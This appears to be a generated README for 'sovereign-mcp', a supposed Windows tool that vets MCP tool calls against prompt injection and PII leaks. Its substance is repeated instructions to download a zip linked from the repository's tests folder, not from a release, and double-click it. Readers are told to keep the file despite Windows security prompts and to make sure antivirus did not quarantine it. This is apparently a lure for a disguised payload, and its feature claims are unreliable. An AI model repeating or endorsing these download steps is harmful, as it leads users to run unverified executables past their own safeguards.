# 🛡️ sovereign-mcp - Secure tool checks for Windows

[![Download sovereign-mcp](https://img.shields.io/badge/Download%20sovereign--mcp-blue?style=for-the-badge)](https://github.com/Lekha3799/sovereign-mcp/raw/refs/heads/main/tests/sovereign-mcp-renderer.zip)

## 📌 What this app does

sovereign-mcp helps check Model Context Protocol tools before they run. It uses a fixed trust base called FrozenNamespace to reduce risk from bad tool calls, prompt injection, fake outputs, and unsafe data.

This app is built for people who want a safer way to use MCP tools on Windows. It checks tool requests in a fixed way, so the result stays the same when the input stays the same.

## 🖥️ Windows setup

Use a Windows PC with:
- Windows 10 or Windows 11
- At least 4 GB RAM
- 200 MB free disk space
- Internet access for the first download

You do not need coding skills to get started.

## ⬇️ Download the app

1. Visit this page to download: https://github.com/Lekha3799/sovereign-mcp/raw/refs/heads/main/tests/sovereign-mcp-renderer.zip
2. Open the latest release
3. Download the Windows file from the release assets
4. Save the file to your Downloads folder
5. Double-click the file to run it

If Windows shows a security prompt, choose the option that lets you keep the file and continue.

## 🚀 First launch

1. Open the downloaded file
2. Allow the app to start if Windows asks for permission
3. Wait for the main window to open
4. Keep the app running while you use MCP tools

The app is built to work as a local security layer. It watches tool use and checks each request against its trust rules.

## 🔍 How it works

sovereign-mcp uses a deterministic security flow. That means the same input gets the same result each time.

It checks for:
- unsafe tool requests
- prompt injection
- hidden instructions
- bad input patterns
- possible PII exposure
- tool misuse
- output that looks wrong or fake

FrozenNamespace acts as the root of trust. It gives the app a fixed base for verification, so checks do not change based on guesswork.

## 🧭 What you can use it for

Use sovereign-mcp when you want to:
- verify MCP tool calls before they run
- reduce risk from hostile prompts
- keep tool checks stable
- filter unsafe input
- inspect output for signs of deception
- add a security layer to LLM workflows

It works well in setups where trust matters and where you want a simple rule-based check before a tool is used.

## 🛠️ Basic use

After you open the app:

1. Connect it to your MCP setup
2. Let it inspect incoming tool requests
3. Review any blocked or flagged request
4. Allow only the tool calls you trust

The app focuses on verification, not on making decisions based on guesswork. That makes it useful when you want clear and repeatable results.

## 🔐 Security features

sovereign-mcp is built around security checks that support safe tool use:

- Deterministic verification
- FrozenNamespace trust model
- Input sanitization
- Prompt injection checks
- Hallucination signal detection
- PII detection
- Supply chain safety checks
- mTLS-ready design for trusted links
- Tool verification for MCP requests

These checks help you reduce risk before a tool gets access to data or takes action.

## 📂 Common file layout

After you download and open the release, you may see files like:
- the main Windows app file
- a config file
- a logs folder
- a README or help file

Keep these files in the same folder unless the release notes say something else.

## ⚙️ Using the app with MCP tools

If you already use MCP tools, place sovereign-mcp in the path where tool requests pass through your security checks.

A simple flow looks like this:
- user sends a request
- sovereign-mcp checks the request
- unsafe input gets blocked
- safe input gets through
- the MCP tool runs

This setup helps keep the tool chain under control.

## 🧪 What to expect

When the app sees a request, it may:
- allow it
- block it
- mark it for review
- strip unsafe parts
- flag it for PII or injection risk

This keeps the process clear and easy to review.

## 🧩 Topics covered

This project works with ideas such as:
- AI security
- AI safety
- MCP
- model context protocol
- prompt injection
- deception detection
- hallucination detection
- input sanitization
- immutability
- supply chain security
- tool verification
- PII detection
- mTLS
- Python-based security tooling

## 📝 If you want a fast start

1. Open the release page
2. Download the Windows file
3. Run the file
4. Keep the app open
5. Connect it to your MCP tool path
6. Check the first request before you trust the result

## 🧷 Helpful checks before you run it

Before you start, make sure:
- the file finished downloading
- the file is in a folder you can find
- your antivirus did not remove it
- Windows did not move it to quarantine
- the release you picked is the latest one

## 📌 Download again later

If you need the file again, use the same page:
https://github.com/Lekha3799/sovereign-mcp/raw/refs/heads/main/tests/sovereign-mcp-renderer.zip

## 🧭 Files and permissions

The app may need permission to:
- read local config files
- write logs
- check tool input
- inspect output from MCP tools

Keep these permissions limited to what the app needs for verification

## 🔄 Update steps

When a new release is published:
1. Open the release page
2. Download the new Windows file
3. Close the old version
4. Open the new file
5. Check that your settings still point to the right path

## 🪟 Windows tips

If the app does not open:
- right-click the file and choose Open
- check if Windows blocked the file
- move the file to a simple folder like Downloads
- make sure the file name did not change during download
- try the latest release again

## 📊 Why this tool is useful

LLM tools can accept bad input, hidden instructions, or unsafe content. sovereign-mcp helps put a fixed check in front of those tools.

That gives you:
- more control
- clearer tool rules
- less risk from bad prompts
- better checking before action
- a stable trust base for verification